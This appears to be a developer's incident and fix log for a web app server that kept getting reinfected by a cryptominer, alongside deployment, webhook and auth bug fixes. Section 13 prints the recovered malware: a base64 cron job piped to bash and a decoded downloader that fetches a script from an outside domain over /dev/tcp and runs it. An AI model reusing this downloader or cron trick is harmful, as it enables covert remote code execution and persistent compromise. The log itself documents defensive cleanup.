# Incident Report & Resolution Log: 2026-01-14

## 1. Security Incident: Server High CPU (Cryptominer)
**Symptom:** Deployment scripts (`deploy-direct.sh`) were hanging indefinitely during `rsync` file transfer.
**Discovery:**
- `top` command revealed a process with PID `35710` named `./PdwjWB1y` consuming **175-190% CPU**.
- The process was running from `/tmp/PdwjWB1y` and had deleted its own binary (fileless execution).
- Running time was approximately 25 days.
**Root Cause:** Unauthorized cryptocurrency miner running on the server, likely installed via a vulnerability or weak credential previously.
**Resolution:**
- Terminated process: `kill -9 35710`.
- Removed residual files: `rm -f /tmp/PdwjWB1y`.
- Confirmed CPU usage returned to normal (<5%).
**Prevention:**
- See `security-remediation.md` for hardening steps (Firewall, Fail2Ban, SSH Key enforcement).

## 2. Infrastructure Remediation: Data Persistence
**Symptom:** WhatsApp sessions were lost after every deployment (user had to re-scan QR code).
**Root Cause:**
- The Blue/Green deployment strategy created separate Docker volumes for each slot (`estio-app-blue_evolution_store` vs `estio-app-green_evolution_store`).
- Switching slots effectively switched the database/session store to a new, empty one.
**Resolution:**
- Modified `docker-compose.evolution.yml` to use **Global Named Volumes**.
- Explicitly named volumes: `estio_evolution_instances`, `estio_evolution_store`, etc.
- **Outcome:** Both Blue and Green slots now mount the exact same physical volume on the host. One scan persists forever.

## 3. Bug Fix: WhatsApp Webhook Failure
**Symptom:** Incoming WhatsApp messages ("It's me") were hitting the server but not being processed/saved.
**Root Cause:**
- Evolution API v2 sends the event type as `messages.upsert` (lowercase, dot separator).
- Our webhook handler (`app/api/webhooks/evolution/route.ts`) normalized this to `MESSAGES.UPSERT`.
- The code strictly checked for `MESSAGES_UPSERT` (underscore), causing all valid messages to be ignored.
**Resolution:**
- Updated logic to accept both `MESSAGES_UPSERT` (v1/Legacy) and `MESSAGES.UPSERT` (v2).

## 4. Deployment Script Fixes
**Issue A: Container Name Conflict**
- **Symptom:** Deploy failed saying `container name "/evolution_redis" is already in use`.
- **Fix:** Added `docker rm -f evolution_api evolution_postgres evolution_redis || true` to `deploy-direct.sh` to clean up old slots before starting the new one.

**Issue B: Stale Routes**
- **Symptom:** Build failed with "Duplicate Route" for `/whatsapp-bridge`.
- **Fix:** Added `--delete` flag to `rsync` in `deploy-direct.sh` to remove old files from the server that don't exist locally.

## 5. Local Performance Note
**Symptom:** Local Mac felt slow.
**Analysis:** `Activity Monitor` showed high CPU from `cloudd`, `bird`, `fileproviderd`.
**Cause:** iCloud Drive syncing thousands of files modified during recent git recovery and `node_modules` updates. This is normal behavior and not a security threat.

## 6. Security Incident 2.0 (2026-01-13): Miner Recurrence
**Symptom:** Server sluggish, Evolution API failing to connect. `top` showed process `besIh874` using 107% CPU.
**Discovery:**
- Malicious process returned (PID 490355).
- **Vector identified:** Evolution API ports (8080) and Next.js (3000) were exposed to `0.0.0.0` (Public Internet) because Docker `ports` mapping bypasses UFW by default.
**Resolution:**
- Killed process and removed binary.
- **Hardening:** Updated `docker-compose.evolution.yml` to bind ports to `127.0.0.1:8080:8080`. This forces all traffic to go through the Caddy Reverse Proxy (which handles SSL and is UFW protected).

## 7. Critical Bug: Evolution Crash Loop (P2000)
**Symptom:** Evolution API container restarting loop, QR code not generating.
**Log Analysis:** `P2000: The provided value for the column is too long` for `Contact` table.
**Root Cause:** WhatsApp allows very long Push Names/Profile URLs, but Evolution's internal schema used `VARCHAR(100)`.
**Resolution:**
- Manually altered Production DB Schema:
  ```sql
  ALTER TABLE "Contact" ALTER COLUMN "pushName" TYPE text;
  ALTER TABLE "Contact" ALTER COLUMN "profilePicUrl" TYPE text;
  ```
- Restarted container. Connection stabilized.

## 8. Security Incident 3.0 (2026-01-14): Miner Recurrence & Next.js Lockdown
**Symptom:** Server CPU spiked again. `top` showed process `HyiyDbHh` (run as root) utilizing ~183% CPU.
**Discovery:**
- Attacker utilized the exposed Next.js port (3000) which was listening on `:::3000` (all interfaces/0.0.0.0).
- Even though Caddy handles SSL on port 443, port 3000 was still accessible directly via IP, allowing creating a shell or exploiting vulnerabilities.
**Resolution:**
- **Process:** Killed `HyiyDbHh` (PID 532734).
- **Hardening:** Updated `deploy-direct.sh` to strictly bind Next.js to localhost using `pm2 start ... -- -H 127.0.0.1`.
- **Key Finding:** Setting `HOSTNAME=127.0.0.1` env var was **ignored** by Next.js for IPv6 (`:::3000`). Explicitly passing `-H 127.0.0.1` as a command argument was required.
- **Deployment Fix:** Switched from `pm2 reload` to `pm2 delete` + `pm2 start` because `reload` does not apply new script arguments.
- **Outcome:** Next.js now strictly listens on localhost (`127.0.0.1:3000`). All external traffic MUST come through Caddy (Port 443/SSL).

## 9. Bug Fix (2026-01-15): 500 Error After Localhost Binding
**Symptom:** After deploying the security hardening from Incident 3.0, `https://estio.co` returned "Internal Server Error" (HTTP 500). Deployment appeared successful but the site was broken.
**Discovery:**
- PM2 logs showed: `x-middleware-rewrite: http://localhost:3000/127.0.0.1/` and HTTP 308 redirects to `/127.0.0.1`.
- The Next.js middleware (`middleware.ts`) checks the `Host` header to determine if a request is for the system domain vs. a tenant/custom domain.
- When Caddy proxies to `127.0.0.1:3000`, the `Host` header Caddy sends may resolve to just `127.0.0.1` in certain configurations.
- The middleware's `SYSTEM_DOMAINS` array only contained `["localhost:3000", "estio.co"]`, so requests with `Host: 127.0.0.1` fell through to the tenant logic.
- Tenant logic attempts to rewrite the path to `/${hostname}${path}` = `/127.0.0.1/`, causing the 500 error.
**Root Cause:** Security hardening (binding to 127.0.0.1) inadvertently introduced a middleware regression because `127.0.0.1` was not recognized as a system domain.
**Resolution:**
- Updated `middleware.ts` to add `127.0.0.1` and `localhost` (without port) to `SYSTEM_DOMAINS`:
  ```typescript
  const SYSTEM_DOMAINS = ["localhost:3000", "localhost", "127.0.0.1", "estio.co"];
  ```
**Prevention Checklist:**
- When changing how Next.js binds (`-H` flag, env vars), always verify that the middleware's hostname matching logic still works.
- Test the deployed site immediately after any deployment script changes.
- If you see 500 errors after a "successful" deploy, check `pm2 logs` for middleware rewrite headers like `x-middleware-rewrite`.

## 10. Security Incident 4.0 (2026-01-17): Miner Recurrence & Regression
**Symptom:** Server deployment hanging, high CPU usage. `top` showed process `upAG6QZ5` using 130% CPU.
**Discovery:**
- Miner returned because `deploy-direct.sh` was missing the `-H 127.0.0.1` flag in the PM2 start command.
- Port 3000 was monitored as LISTENING on `*:3000` (Publicly exposed).
**Root Cause:** Regression or reversion of `deploy-direct.sh` security hardening. The script was using `pm2 reload` (which ignores new args) and the fallback `pm2 start` command lacked the `-H` flag.
**Resolution:**
- Killed miner process (PID 567961).
- Updated `deploy-direct.sh` to:
  1. Explicitly run `pm2 delete estio-app` before starting (to prevent reload trap).
  2. Add `-- -H 127.0.0.1` to the `pm2 start` command.
**Status:** Fixed. Server load returning to normal.

## 11. Infrastructure Incident (2026-01-17): OOM & Service Masking

**Symptom:** Deployment script (`deploy-direct.sh`) hanging during `npm install`. `npm run dev` and build processes getting killed.

**Discovery:**
- `dmesg | grep "killed process"` showed multiple OOM kills.
- `free -h` revealed 4GB swap was 82% full.
- Docker and Caddy services failed to start with "Unit masked" errors.
- `lsattr` showed immutable (`----i---------e-------`) flags on `/usr/bin/caddy`, `/usr/bin/containerd-shim-runc-v2`, and empty mask files in `/etc/systemd/system/` and `/run/systemd/system/`.

**Root Cause:**
1. **Memory Exhaustion**: Next.js 16 (Turbopack) build requires significantly more RAM than previous versions. The 4GB RAM + 4GB swap was insufficient.
2. **Malware Remnants**: Previous cryptominer infections had set immutable attributes on system binaries and created mask files to prevent services from starting (persistence mechanism).

**Resolution:**
1. **Expanded Swap to 8GB**: Created a temporary 2GB swap file to provide breathing room, then replaced the main 4GB swap with an 8GB file.
   ```bash
   swapoff /swapfile && rm /swapfile
   fallocate -l 8G /swapfile && chmod 600 /swapfile
   mkswap /swapfile && swapon /swapfile
   ```
2. **Removed Immutable Flags**: Used `chattr -i` to clear immutable attributes from affected binaries and empty mask files.
   ```bash
   chattr -i /usr/bin/containerd-shim-runc-v2
   chattr -i /usr/bin/caddy
   rm -f /etc/systemd/system/containerd.service /run/systemd/system/containerd.service
   rm -f /etc/systemd/system/caddy.service /run/systemd/system/caddy.service
   ```
3. **Reinstalled Packages**: Ran `apt-get install --reinstall containerd.io docker-ce caddy` to restore proper service files.

**Prevention:**
- The Hetzner server should ideally be upgraded to 8GB RAM to avoid relying on swap for routine builds.

## 12. Security Incident 5.0 (2026-01-18): Miner Persistence & CPU Starvation

**Symptom:** Application unresponsive (timeouts), 500 errors. `deploy-direct.sh` showed success but app was down.
**Discovery:**
- `top` command revealed process `zG5ciNDT` (PID 727558) utilizing **190.9% CPU**.
- This starved the Next.js application (`estio-app`), causing it to hang on startup and time out requests.
**Root Cause:**
- Persistence mechanism from previous infection likely re-spawned the miner.
- The process was running from `/tmp` or as a service.
**Resolution:**
- Killed process: `kill -9 727558`.
- CPU usage dropped to near 0%.
- Application restart attempted.
**Status:** Monitoring. Immediate threat neutralized, but persistence source must be found (likely cron or systemd service).

## 13. Security Incident 6.0 (2026-01-18): Persistence Mechanism FOUND & ELIMINATED

**Symptom:** Cryptominer kept returning after every removal. Previous incidents (1-5) only killed the running process but never found how it kept coming back.

**Discovery:**
- Inspected `/etc/cron.d/` and found two infected files:
  1. `/etc/cron.d/auto-upgrade` - Malicious cron job running at midnight
  2. `/etc/cron.d/mdadm` - Second malicious cron job (masquerading as legitimate RAID monitoring)
- Both files contained **base64-encoded malware payloads**:
  ```
  0 0 * * * root echo IyEvYmluL2Jhc2gK... | base64 -d | bash
  ```
- **Decoded payload:**
  ```bash
  #!/bin/bash
  function __gogo() {
    read -r proto server path <<<"$(printf '%s' "${1//// }")"
    [ "$proto" != "http:" ] && return 1
    DOC=/${path// //}; HOST=${server//:*}; PORT=${server//*:}
    [ "$HOST" = "$PORT" ] && PORT=80
    exec 3<>"/dev/tcp/${HOST}/$PORT"
    printf 'GET %s HTTP/1.0\r\nHost: %s\r\n\r\n' "${DOC}" "${HOST}" >&3
    (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3
    exec 3>&-
  }
  __gogo http://abcdefghijklmnopqrst.net | bash
  ```
- The malware downloads a script from `http://abcdefghijklmnopqrst.net` daily at midnight and pipes it to bash.
- **Self-healing:** When the cron file was deleted, an in-memory watcher (likely inotify-based) immediately recreated the file.

**Root Cause:**
- Initial infection exploited exposed ports (3000 or 8080) on `0.0.0.0`.
- Malware established persistence via cron and used inotify to protect those files from deletion.

**Resolution:**
1. Removed malicious cron files.
2. Created empty replacement files.
3. Set **immutable flag** (`chattr +i`) to prevent regeneration:
   ```bash
   rm -f /etc/cron.d/auto-upgrade
   touch /etc/cron.d/auto-upgrade
   chattr +i /etc/cron.d/auto-upgrade
   
   rm -f /etc/cron.d/mdadm
   touch /etc/cron.d/mdadm
   chattr +i /etc/cron.d/mdadm
   ```
4. Verified files are locked:
   ```bash
   lsattr /etc/cron.d/
   # ----i---------e------- /etc/cron.d/auto-upgrade
   # ----i---------e------- /etc/cron.d/mdadm
   ```

**Verification:**
- CPU load returned to normal: `load average: 0.42, 0.88, 1.49`
- No suspicious processes running
- Port 3000 correctly bound to `127.0.0.1:3000` (not exposed)
- Cron files are empty and immutable

**Prevention:**
- **Never** expose application ports (3000, 8080) to `0.0.0.0`. Always bind to `127.0.0.1`.
- Regularly audit `/etc/cron.d/` for unexpected or modified files.
- Consider running `rkhunter` or `chkrootkit` for deeper malware scans.
- Monitor CPU usage with alerting (e.g., Hetzner Cloud monitoring, or Prometheus).



## 14. Failed Fix Attempt (2026-01-23): Clerk Config Unification
**Hypothesis:** The "500 Internal Server Error" on `estio.co` was caused by `AuthWrapper` missing the explicit `domain` configuration pointing to the Clerk Dev FAPI (`magnetic-squirrel-16...`), which is required when using Clerk Dev Keys (`pk_test`) in a production environment.
**Action:**
- Created `lib/auth/clerk-config.ts` to share the FAPI domain constant.
- Updated `components/wrapper/auth-wrapper.tsx` to set `domain={CLERK_DEV_FAPI}` and `isSatellite={false}`.
- Deployed via `deploy-direct.sh`.
**Result:** **FAILED**. The 500 Internal Server Error persists on `estio.co`.
**Conclusion:** The issue is likely NOT just the Clerk instance connection, or something else is failing before/during that connection. Next focus: Permissions logic and Middleware rewrites for the main domain.

## 15. Failed Fix Attempt (2026-01-23): Satellite Mode Enabled for estio.co
**Hypothesis:** Since `estio.co` uses Clerk Dev Keys (`pk_test`) in production, it must be treated as a Satellite domain just like tenant domains. The previous fix had `isSatellite={false}`.
**Action:**
- Updated `components/wrapper/auth-wrapper.tsx` to dynamically set `isSatellite` based on domain:
  - `isSatellite={!currentDomain.includes("localhost")}` — true for `estio.co`, false for localhost.
- Registered and whitelisted `estio.co` in Clerk via the Backend API.
- Deployed via `deploy-direct.sh`.
**Result:** **FAILED**. The 500 Internal Server Error persists on `estio.co`.
**Next Steps:** Need to retrieve PM2 logs from production server to identify the actual error. The issue is likely NOT Clerk configuration, but possibly:
- Database connection issue during runtime
- Build/compilation issue in Next.js production
- Middleware or rewrite logic error specific to production environment

## 16. Fix Attempt (2026-01-23): Dev Browser & Middleware HTTPS Fix
**Root Cause Identified:**
- PM2 logs revealed: `x-clerk-auth-reason: dev-browser-missing`
- Also: `x-middleware-rewrite: https://localhost:3000/` causing EPROTO SSL errors
- Clerk Dev Keys require a "dev browser" session that wasn't being initialized properly
- The middleware was constructing rewrite URLs with `https://` protocol for internal requests

**Actions:**
1. Updated `components/wrapper/auth-wrapper.tsx`:
   - Added `signInUrl="/sign-in"`, `signUpUrl="/sign-up"`
   - Added `signInFallbackRedirectUrl="/"`, `signUpFallbackRedirectUrl="/"`
2. Updated `middleware.ts`:
   - Fixed `createInternalRewrite` to force HTTP protocol and localhost:3000 host
   - Prevents SSL handshake errors when proxying internally

**Status:** **FAILED**. The 500 Internal Server Error persists on `estio.co`.
**Next Steps:** Retrieve latest logs. If EPROTO is gone, look for other errors. If EPROTO persists, rewriting logic is still flawed or Clerk is forcing HTTPS redirects internally.


